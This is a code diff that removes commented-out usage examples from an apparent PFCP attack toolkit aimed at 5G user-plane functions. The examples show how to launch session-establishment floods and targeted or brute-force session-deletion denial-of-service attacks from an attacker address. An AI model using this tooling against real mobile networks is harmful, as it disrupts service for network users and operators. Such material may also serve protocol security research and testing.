@@ -1276,42 +1276,6 @@ class PFCPDosAttack:
 
 
 
-########## UTILISATION PFCPToolkit
-
-# # option 1: (mieux si on veut faire plusieurs requêtes sur le même upf)
-# objet_test = PFCPToolkit(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, verbose=True)
-# objet_test.Send_PFCP_association_setup_req()
-# objet_test.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")
-
-# # option 2: (plus modulable)
-# PFCPToolkit().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# PFCPToolkit().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
-#                                               seid=0xC0FFEE, ue_addr="1.1.1.1")
-
-
-
-########## UTILISATION PFCPDosAttack
-
-### SESSION ESTABLISHMENT FLOOD ATTACK (DoS)
-# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# objet_dos.set_verbose(True)
-# objet_dos.set_randomize(True)
-
-# objet_dos.set_random_far_number(int(sys.argv[3]))
-# objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
-
-
-### SESSION DELETION ATTACK (targeted DoS)
-# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# objet_dos.set_verbose(True)
-# objet_dos.Start_pfcp_session_deletion_targeted(smf_addr=sys.argv[1], target_seid=int(sys.argv[2], 0))
-
-
-### SESSION DELETION ATTACK (DoS)
-# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
-# objet_dos.set_verbose(True)
-# objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
-
 
 def main():
     
